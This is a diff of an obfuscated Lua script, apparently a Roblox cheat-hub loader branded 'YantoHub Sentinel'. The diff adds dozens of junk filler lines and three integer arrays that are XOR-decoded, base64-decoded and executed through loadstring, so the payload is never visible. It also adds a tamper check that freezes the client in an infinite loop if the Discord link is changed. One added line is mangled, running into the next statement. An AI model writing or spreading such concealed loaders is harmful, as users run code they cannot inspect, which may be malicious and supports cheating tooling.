@@ -1,40 +1,121 @@
---// Protected by YantoHub Sentinel
---// Join our discord: https://dsc.gg/yantorobloxhub
 
-local xetYwLKQIzFDTUB = 4998; local function OAiJjNAADvkzIS() return 62 end; local WthkPGHxEldaZ = OAiJjNAADvkzIS();
-local pRUliBURGRQHiyA = 3840; local function jiMInTfgSfaS() return 833 end; local FvVgSriBoD = jiMInTfgSfaS();
-local yEXQCzSIEQn = 1803; local function aSLnexdyFFS() return 839 end; local pySgtHJYaPa = aSLnexdyFFS();
-local AqoUkFAohAEoDkBC = 5497; local function TnTcunZSbIJc() return 716 end; local BZNTRoGlmRpwZabF = TnTcunZSbIJc();
-local kKHaxacuEWe = 9600; local function GSidccifbanusFQQ() return 389 end; local bPDNcQDwQRt = GSidccifbanusFQQ();
-local mVwSACHXnR = 1417; local function iGTGAsJtQAXtdts() return 729 end; local xbFmxfJjIk = iGTGAsJtQAXtdts();
-local FQUAfJKnOUEn = 9582; local function yaIMMPgqCIToHDdr() return 309 end; local hZeeEPXkxXvxsSyD = yaIMMPgqCIToHDdr();
-local wBPTfHjjk = 6833; local function OdGBpXbDbP() return 434 end; local ocQyutTlX = OdGBpXbDbP();
-local XuChccXXUZ = 8680; local function fSozwgpaMzHfe() return 931 end; local VhPNUWPFCdR = fSozwgpaMzHfe();
-local gvaKyYzLiWwd = 4120; local function QmdcJhRTSKgn() return 173 end; local YmlOAKUBUvoL = QmdcJhRTSKgn();
-local wcDviAKIErlaLGt = 5604; local function CPXCSanFBPzn() return 487 end; local dbHoZhbsQErb = CPXCSanFBPzn();
-local oJJhmyTDrKKli = 8677; local function wpHuQqdqDfZH() return 254 end; local KfQGuexAq = wpHuQqdqDfZH();
-local tiDKyMUlmQ = 2126; local function noWroAUnbyotZ() return 223 end; local SoxlBoWldvy = noWroAUnbyotZ();
-local gnRAXNMVpikph = 6839; local function NjZjaOEAQ() return 465 end; local xpuUAsyix = NjZjaOEAQ();
-local fvyOPQLIQFoOG = 2312; local function mcnRrlLNzNl() return 11 end; local zjaqOqOcZwBZ = mcnRrlLNzNl();
-local PoTUTmIao = 7938; local function LPAFETmJYuQSC() return 815 end; local TvexqNKkhGFlVyu = LPAFETmJYuQSC();
-local vyPNFtboTmCb = 9700; local function MAKykpVDyuWlIz() return 248 end; local MhYUfftej = MAKykpVDyuWlIz();
-local bdbXSfeWEXFlSVH = 4714; local function CxkyBTrC() return 832 end; local oycQrlkD = CxkyBTrC();
-local mnUXHtzJdcKCX = 1594; local function izTpJQnuFJ() return 855 end; local eMoRscVDhn = izTpJQnuFJ();
-local FEgxIniuzDZ = 9175; local function OUJGnZfQhMdsJEpR() return 358 end; local fRGGJpDMhuouspvy = OUJGnZfQhMdsJEpR();
-local QCXeVwKPwrb = 9236; local function nptNLJxgbolMag() return 452 end; local hjPcMKBojWUjaFF = nptNLJxgbolMag();
-local zJmDXTllnDIU = 9821; local function QRxhqqkUEqUSOtP() return 905 end; local hdeWbTQULnSF = QRxhqqkUEqUSOtP();
-local oqQTNyhTunNUv = 5623; local function pqAiOweB() return 74 end; local HiDCgfPtxmbTjHP = pqAiOweB();
-local KFCyDpXlz = 9554; local function rbboSXRUqckPScOR() return 80 end; local LDCbjHDGOsN = rbboSXRUqckPScOR();
-local NuaRwdGazrk = 6941; local function ZcwgCFQzxLbOR() return 617 end; local AtcAaHMoVBHHt = ZcwgCFQzxLbOR();
-local FjJVJThqGLKXx = 8071; local function dMxxDpXQa() return 28 end; local XrzrEAfZKy = dMxxDpXQa();
-local dheANmttLtrxQVyR = 9778; local function lYSlnIXxlyZe() return 857 end; local umzqtupa = lYSlnIXxlyZe();
-local lbyiDQVZeIy = 1669; local function VvivdyBfExGkb() return 746 end; local UztsLDNfUVJ = VvivdyBfExGkb();
-local oPonSnMLhPwfOv = 4217; local function TyqZVHWwcGqXfO() return 751 end; local XzCZFUPEp = TyqZVHWwcGqXfO();
-local WyQwYRaK = 6180; local function BDfmYTUDErBnOhea() return 409 end; local aaZLQWxjUiJOgPbm = BDfmYTUDErBnOhea();
-local nwzDiBwtiQrLCF = 3011; local function pMOOxtjlixSd() return 443 end; local HaMTHhvh = pMOOxtjlixSd();
-local CfxgcorD = 6265; local function VREBzKttMlso() return 186 end; local RVoIZKLhL = VREBzKttMlso();
-local rBCksrViGasrcFXk = 3690; local function YCWVmQIrZXwW() return 221 end; local DoAPLdSCJzcaTUv = YCWVmQIrZXwW();
-local wwTVQRuTJyn = 8174; local function KCokNcZlmJOlSUA() return 57 end; local HgTuBRkx = KCokNcZlmJOlSUA();
+local MwcVYsUlUVOC = 1171; local function QZbTUUVWDmsyyaem() return 496 end; local LaMzIioSjfe = QZbTUUVWDmsyyaem();
+local JPtsRUpPVqSSp = 8878; local function LFIBUgrmdO() return 122 end; local khsRkHHvQIlixHxY = LFIBUgrmdO();
+local lgSBWnvD = 5668; local function xpNXOZOxUDbORh() return 342 end; local momiawyd = xpNXOZOxUDbORh();
+local lThRRxsqjXffFAI = 7460; local function QYmtvGSC() return 394 end; local taplBQyMXgCFps = QYmtvGSC();
+local pgIlYczaVUwU = 3159; local function UCejuBdzhw() return 392 end; local WhcrNaMcI = UCejuBdzhw();
+local YSUfNBbAyWcvPrP = 1595; local function lNJfWogHECUnMR() return 723 end; local aJYZLcXiVpODqdX = lNJfWogHECUnMR();
+local VoIuZLasx = 3543; local function zHNkFZZL() return 506 end; local eYVYzYoZ = zHNkFZZL();
+local lRtAhjgmWzFH = 4559; local function cYzATmxSzR() return 617 end; local HjNsLzcUvhnq = cYzATmxSzR();
+local udQCUTYTQeYnMD = 5280; local function ImHFCcAv() return 35 end; local zilmLtrNPlUR = ImHFCcAv();
+local azjXsRVZOgIDbb = 7850; local function ohCZdnNexUvqw() return 547 end; local yLVyBfIKBTaSOPw = ohCZdnNexUvqw();
+local MIQGdEqUgHNIXvi = 4462; local function bdpXhwKabnemxAd() return 905 end; local NxlILxaIjiPUpYLr = bdpXhwKabnemxAd();
+local WneVtmnYVLNVcBJ = 4131; local function dKrisWGsFigbgsk() return 358 end; local phadVXWtl = dKrisWGsFigbgsk();
+local xiTXOAvhihSX = 7379; local function UDpigDFM() return 571 end; local LCLpTRlDPCVc = UDpigDFM();
+local GvYtdyus = 6040; local function BBVFlxIslMmbTC() return 679 end; local NermkxlNyy = BBVFlxIslMmbTC();
+local jEaIoKuit = 6207; local function XaNqKXwGrAw() return 455 end; local HIQYFsdt = XaNqKXwGrAw();
+local dFWAuArQhWYvX = 5948; local function sGYukWFP() return 450 end; local EpeQqRcneECn = sGYukWFP();
+local zugQiepOjdg = 2564; local function TpCCWLgtDqRj() return 306 end; local utQXQZyTdKwxvAH = TpCCWLgtDqRj();
+local kIgXHLIJHol = 1080; local function NVtacdqLxRsdPt() return 862 end; local vlNdaHcmgdGkzKuT = NVtacdqLxRsdPt();
+local kKikMUzHmhXNsrc = 2942; local function XXAQPDDNkUgVD() return 772 end; local nQeTctStdYtqPoGC = XXAQPDDNkUgVD();
+local LktbRycCVUco = 3217; local function lgkXvJsrC() return 386 end; local DkDXqdGdECRX = lgkXvJsrC();
+local AolOyZAVfsGFZBpX = 8975; local function EEmtHgivfp() return 18 end; local ebXPMRttbw = EEmtHgivfp();
+local uuLgDtqocIKgLra = 4006; local function HcsDQjhkxuJ() return 111 end; local fzfSjiRYW = HcsDQjhkxuJ();
+local VIMubKhBVUnuM = 5921; local function GeQBkNMKuPzf() return 271 end; local dlnNutqHUR = GeQBkNMKuPzf();
+local LxeDqFUFObe = 1886; local function yMBiMlaf() return 652 end; local aQIKwIuPgm = yMBiMlaf();
+local kHVWcSOldmzSVCm = 7743; local function WfMuGbVV() return 188 end; local rTHmAnCbxyKUn = WfMuGbVV();
+local ensarwIttdFCLuf = 4119; local function fxtkWiqOhwePCeSJ() return 85 end; local OxhppssVpmykjzwK = fxtkWiqOhwePCeSJ();
+local NTdlkqvagwUkDGhc = 2318; local function InjeHlkPgQMjmdBj() return 137 end; local ZNAjOAASeX = InjeHlkPgQMjmdBj();
+local McKBQhTmPntfOdcz = 2614; local function mRcRIPcILhrhvzb() return 635 end; local gKTXjcIJAEPQxX = mRcRIPcILhrhvzb();
+local ABPmiqfosNjUwrZT = 6332; local function jVDuyhBbRnprFh() return 39 end; local MGEFyVJnDtjlP = jVDuyhBbRnprFh();
+local rvajIoIdIX = 6237; local function OzCgWMNIswGcv() return 267 end; local DFyoWMBr = OzCgWMNIswGcv();
+local ZpZIctcnu = 2494; local function dSZNdXpAkcR() return 6 end; local XBcGWvtIxRSy = dSZNdXpAkcR();
+local XgwBvjdPFgU = 9825; local function sszERXmzdbOe() return 509 end; local OAnqtNBYJ = sszERXmzdbOe();
+local ydWaBBAvp = 2456; local function NujezzNTORqQxYRn() return 580 end; local rtWcPaINpV = NujezzNTORqQxYRn();
+local OpFBxLxSONpuUL = 4375; local function XzMtKMvTcTxepDA() return 640 end; local YiVIsTsdTBoXi = XzMtKMvTcTxepDA();
+local GHujfUSvp = 2088; local function qorivbBzsBWZ() return 137 end; local mSryOckuzSuovGTj = qorivbBzsBWZ();
+local ILCkXnnrCU = 1976; local function cVplPOFjmJLLPPr() return 743 end; local xtwyNDnTiugnw = cVplPOFjmJLLPPr();
+local OSWWfqyns = 4414; local function ylEvKlFVnCJlT() return 90 end; local awTCfTAM = ylEvKlFVnCJlT();
+local YaAktjeBQkw = 5156; local function ozUWEzMMhfZJgcW() return 483 end; local YUzAQEzBuykJZh = ozUWEzMMhfZJgcW();
+local rSCuLRHDWQ = 5092; local function xsfxDqss() return 88 end; local OZajkmeIC = xsfxDqss();
+local xSOgfABn = 3299; local function DzuTpKyskZuUtV() return 928 end; local DfAXZpMWvbnnrT = DzuTpKyskZuUtV();
+local iCgJkfvwWj = 4665; local function ehHrLgBNHeffm() return 978 end; local xuFOPGCRuQsio = ehHrLgBNHeffm();
+local jHXDuJGRLVdfvlD = 9026; local function kYMIFqKJHYyQH() return 229 end; local CemmZUvjuGYEVn = kYMIFqKJHYyQH();
+local HCiCiFfGUmIYms = 7775; local function WsKmbadBouhTE() return 599 end; local cGlMigPHOWhb = WsKmbadBouhTE();
+local ZCrblNMgTae = 5518; local function BeHuvXOhQp() return 473 end; local BcJqwtoQeS = BeHuvXOhQp();
+local PFgerkrcQLvt = 1431; local function YvEMBCSsMRTAtJEK() return 720 end; local FbeaTYef = YvEMBCSsMRTAtJEK();
+local jTgghgTKmSWCn = 6100; local function bIIdCbkhxJXVOa() return 144 end; local scsFFxzcx = bIIdCbkhxJXVOa();
+local VoBfFwGOlc = 8478; local function ckCWHvQxBCommWK() return 74 end; local JQEwIBXZKOA = ckCWHvQxBCommWK();
+local ClcOOlNgFlrMSrp = 9001; local function KnlChXNpVNTUiJE() return 599 end; local crtFNXGazebo = KnlChXNpVNTUiJE();
+local RLPBZYYPBp = 2387; local function qGFiJGFnDRed() return 912 end; local fAPPAZzoIBNdJw = qGFiJGFnDRed();
+local fNPVvEPFj = 6187; local function LXNErCVPdPUvAQhi() return 557 end; local LMtYoMlH = LXNErCVPdPUvAQhi();
+local VCwEjWNRVwoRF = 6951; local function gJuZolvTndNmwo() return 726 end; local hjKnygYRbJAWHTr = gJuZolvTndNmwo();
+local JOZbQmzsYmqp = 7186; local function dxzLyyRf() return 813 end; local nNzAHQAU = dxzLyyRf();
+local NrXhpJodzDpZ = 6725; local function FgwOLAqXgjEyzH() return 437 end; local jVXTTxVSlT = FgwOLAqXgjEyzH();
+local bnQTNCWCplB = 5747; local function xpVDhfSyTJUmSoa() return 151 end; local fvUnYNEVBBskC = xpVDhfSyTJUmSoa();
+local mTIvhLCVHKQkY = 7471; local function gcSyDxsKmZZ() return 596 end; local JKSFujVnVYG = gcSyDxsKmZZ();
+local bMYyqSzDu = 5752; local function AEzXlteTICLsxuYF() return 74 end; local chulRitylwWDkWm = AEzXlteTICLsxuYF();
+local yDYySebtIkzNwVk = 3101; local function BSHQNXLqGvy() return 609 end; local gOlbMgZIqzw = BSHQNXLqGvy();
+local pRdUhmptbDoI = 6380; local function dEghWrkFEN() return 760 end; local GuPGzJFUqKekUQwg = dEghWrkFEN();
+local SktiTVSnvhTsE = 4353; local function eHaqfghdeL() return 909 end; local oPXRPpVbkkUi = eHaqfghdeL();
+local PHnFyNTIWu = 8636; local function sHghaPLs() return 828 end; local yRmMJjeOHPpOaFKg = sHghaPLs();
+local CGqqfKJNVm = "https://dsc.gg/yantorobloxhub"
+local function check()
+    if CGqqfKJNVm ~= "https://dsc.gg/yantorobloxhub" then
+        while true do end
+        return false
+    end
+    return true
+end
+if not check() then return end
+local kZExWwyeFFuo = 12
+local toRalTEYHwNZaYT = {79,97,116,122,85,62,74,127,69,74,66,61,85,62,66,96,111,63,65,107,92,95,78,123,85,62,74,127,110,79,100,97,104,91,57,102,104,75,96,122,110,101,107,124,69,68,70,96,104,68,90,117,110,101,78,98,85,91,61,96,67,103,104,96,104,74,66,96,111,98,86,124,85,62,89,99,69,103,100,60,104,68,78,88,86,84,70,62,109,91,66,96,69,101,103,107,86,91,57,103,71,93,124,124,86,101,78,121,110,63,93,107,89,63,90,102,85,62,90,118,111,117,78,60,109,75,90,121,69,68,70,96,104,68,90,117,110,101,78,96,110,97,93,71,110,75,53,102,85,91,123,107,89,63,90,102,85,62,90,118,111,118,69,127,69,74,70,96,111,63,90,127,104,79,77,53,69,68,78,102,85,91,116,127,71,75,86,61,110,97,66,60,109,91,53,121,71,79,103,107,111,97,90,60,104,84,70,121,69,75,104,100,110,91,89,58,94,62,90,60,89,62,90,117,104,97,96,102,86,95,107,101,95,68,94,60,111,74,66,96,111,98,86,124,85,62,89,101,71,88,124,71,89,60,53,67,94,75,90,102,110,62,94,96,71,79,104,110,65,95,116,60,111,98,90,96,84,95,111,124,69,75,90,121,86,79,103,71,109,91,85,107,110,97,53,60,69,74,66,61,85,62,66,96,111,63,65,117,69,68,94,99,86,91,56,107,111,97,90,60,104,84,70,121,69,75,90,121,86,77,124,127,110,62,66,100,110,79,78,88,104,91,66,102,86,84,66,118,65,117,77,53,69,68,78,102,85,91,116,127,71,75,86,61,110,97,66,60,109,91,53,121,71,79,103,107,111,97,90,60,104,84,70,121,69,75,104,100,110,91,89,121,95,97,53,101,95,91,93,107,86,91,57,103,71,93,124,124,86,101,78,121,110,63,93,107,89,63,90,102,85,62,90,118,111,118,65,107,104,75,100,96,110,101,78,117,86,84,94,61,111,97,56,107,86,91,57,103,79,107,124,127,110,62,66,100,110,79,78,106,89,96,90,67,69,72,60,107,110,75,53,100,86,68,66,60,111,97,96,121,86,123,60,71,110,75,53,102,85,91,123,107,84,60,104,74,90,79,77,53,69,75,104,100,110,91,89,121,95,68,94,60,111,73,104,96,104,77,60,71,72,93,124,127,110,62,66,100,110,79,78,106}
+local hEalvoxM = {95,60,90,86,69,72,60,107,69,97,74,69,89,102,78,102,95,73,60,62,88,68,103,57,104,61,96,85,88,102,78,109,90,61,99,61,88,75,61,75,104,62,66,72,67,88,86,91,105,97,100,85,85,118,74,122,65,75,70,57,67,84,96,86,91,75,65,53,69,107,60,71,72,93,124,127,110,62,66,100,110,79,78,97,104,91,57,102,104,75,96,122,110,101,78,106,94,73,90,72,88,60,94,74,71,74,53,73,93,90,94,78,71,93,60,71,69,79,77,107,69,75,116,122,85,62,74,127,69,75,69,53,70,60,74,79,93,60,94,74,94,103,104,69,95,89,124,64,88,73,61,67,88,61,78,94,89,96,66,89,90,90,86,84,91,74,96,109,85,91,70,102,86,75,90,97,86,62,100,124,109,97,120,127,110,91,57,122,111,68,74,117,111,63,94,61,104,98,104,56,105,84,99,123,65,88,69,118,66,72,89,62,66,118,107,57,71,117,52,98,72,93,99,107,69,79,77,107,84,60,94,78,90,73,73,107,92,95,78,118,104,68,70,124,110,97,111,121,86,63,66,61,85,101,100,106,94,73,74,89,93,95,123,107,70,61,120,105,70,117,56,121,85,101,56,121,70,118,61,104,70,117,123,107,70,117,111,124,72,93,99,107,69,79,77,107,111,97,90,60,104,84,70,121,69,79,100,106,94,73,74,89,93,88,124,98,111,63,90,101,71,79,111,121,70,117,123,107,86,98,90,121,85,63,94,124,110,62,56,99,105,79,103,66,79,101,77,107,69,79,77,107,69,79,77,107,109,91,85,107,71,68,107,107,92,88,60,107,70,118,60,98,71,95,78,60,109,75,90,121,69,68,70,96,104,68,90,117,110,101,77,98,70,117,78,96,110,97,93,66,79,101,77,107,69,79,77,107,69,79,77,107,110,75,53,102,85,91,123,107,111,101,116,97,92,95,111,98,64,79,100,101,67,97,86,124,110,97,93,99,105,79,103,120,65,95,103,66,79,101,77,107,69,79,77,107,69,79,77,107,86,97,53,117,69,75,103,53,66,101,123,116,64,79,60,116,69,75,94,122,72,93,99,107,69,79,77,107,69,79,77,107,69,79,77,107,69,79,78,117,69,72,60,107,111,101,77,121,64,101,77,99,86,101,89,117,84,97,103,107,64,95,78,97,70,88,70,105,71,75,103,120}
+local sSVNTzzYRHvpCdh = {65,95,103,107,92,101,77,123,69,75,74,121,86,79,77,98,65,95,111,107,110,63,69,107,70,118,77,98,71,93,60,71,69,79,77,107,69,79,77,107,69,79,78,96,110,97,93,66,79,101,77,107,69,79,77,107,69,79,77,107,111,97,90,60,104,84,70,121,69,68,69,66,79,101,77,107,69,79,78,96,110,97,93,124,67,97,104,118,104,91,69,99,70,117,90,103,70,91,93,96,86,72,52,96,86,72,52,96,86,72,52,96,86,72,52,96,86,72,52,96,86,72,52,98,64,79,78,97,104,91,57,102,104,75,96,122,110,101,100,56,71,93,60,71,69,79,77,107,69,79,77,107,69,79,78,124,86,101,77,99,69,63,107,107,106,102,60,107,67,79,103,107,104,75,100,96,110,101,78,117,86,84,94,61,111,97,56,107,70,117,111,107,86,91,57,103,72,93,99,107,69,79,77,107,69,79,77,107,69,75,116,122,85,62,74,127,69,75,65,53,65,77,60,71,69,79,77,107,69,79,77,107,69,79,78,97,110,63,69,107,109,88,60,116,64,72,107,107,86,75,52,66,79,101,77,107,69,79,77,107,69,79,77,107,69,79,77,107,69,75,65,107,92,95,78,102,69,79,127,107,71,68,107,58,111,63,90,101,71,75,103,127,109,95,103,107,92,88,60,107,70,118,73,98,69,75,74,121,86,79,77,117,84,101,107,56,64,91,103,124,69,75,53,117,69,72,77,124,72,93,99,107,69,79,77,107,69,79,77,107,69,75,90,121,86,77,60,71,69,79,77,107,69,79,77,107,69,79,78,117,86,84,94,61,111,97,56,107,111,63,94,117,109,91,57,98,64,97,66,99,85,84,69,99,85,117,103,66,79,101,77,107,69,79,78,96,110,97,93,124,71,93,60,71,86,91,57,103,72,93,99,66,79,97,116,122,85,62,74,127,69,74,53,89,93,90,70,68,94,90,93,107,92,95,78,106,94,73,90,72,88,60,94,74,71,74,53,64,94,90,103,124,72,93,124,127,110,62,66,100,110,79,78,106,93,60,53,67,90,73,90,67,90,79,77,53,69,74,53,68,94,90,93,99,86,62,74,120,86,95,123,107,84,61,94,78,89,103,104,74,90,79,103,66,79,107,60,71,84,61,70,90,88,101,100,106,93,60,53,67,90,73,90,67,90,79,103,99,71,93,49,49}
+local function gbphbWOsDXFDdq(...)
+    local t = {...}
+    local r = {}
+    for _,v in ipairs(t) do
+        for _,x in ipairs(v) do table.insert(r, x) end
+    end
+    return r
+end
+local function yPBMDqnZy(tbl, key)
+    local s = ""
+    for i = 1, #tbl do
+        s = s .. string.char(bit32.bxor(tbl[i], key))
+    end
+    return s
+end
+local tWAWDNQtUJonER = gbphbWOsDXFDdq(toRalTEYHwNZaYT, hEalvoxM, sSVNTzzYRHvpCdh)
+local maavyNkOmwHiZh = yPBMDqnZy(tWAWDNQtUJonER, kZExWwyeFFuo)
+local decoded = ""
+pcall(function()
+    if syn and syn.crypt and syn.crypt.base64 then
+        decoded = syn.crypt.base64.decode(maavyNkOmwHiZh)
+    elseif crypt and crypt.base64decode then
+        decoded = crypt.base64decode(maavyNkOmwHiZh)
+    elseif base64 and base64.decode then
+        decoded = base64.decode(maavyNkOmwHiZh)
+    else
+        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+        local data = string.gsub(maavyNkOmwHiZh, '[^'..b..'=]', '')
+        decoded = (data:gsub('.', function(x)
+            if (x == '=') then return '' end
+            local r,f='',(b:find(x)-1)
+            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+            return r;
+        end):gsub('%d%d%d%d%d%d%d%d', function(x)
+            local c=0
+            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+            return string.char(c)
+        end))
+    end
+end)
+if decoded == "" or not decoded then return end
+if not check() then return end
+local run = loadstring(decoded)
+if run then run() endlocal wwTVQRuTJyn = 8174; local function KCokNcZlmJOlSUA() return 57 end; local HgTuBRkx = KCokNcZlmJOlSUA();
 local wZSXEpDDS = 1152; local function vLJgjYleM() return 169 end; local XbxyERzFk = vLJgjYleM();
 local jutnxTsyV = 2866; local function gmNsdKKHf() return 790 end; local QluwlazVoiJ = gmNsdKKHf();
 local IMyzphXbnmtSI = 4487; local function OwCASGEljPHJBjuJ() return 874 end; local pfeXVboslh = OwCASGEljPHJBjuJ();
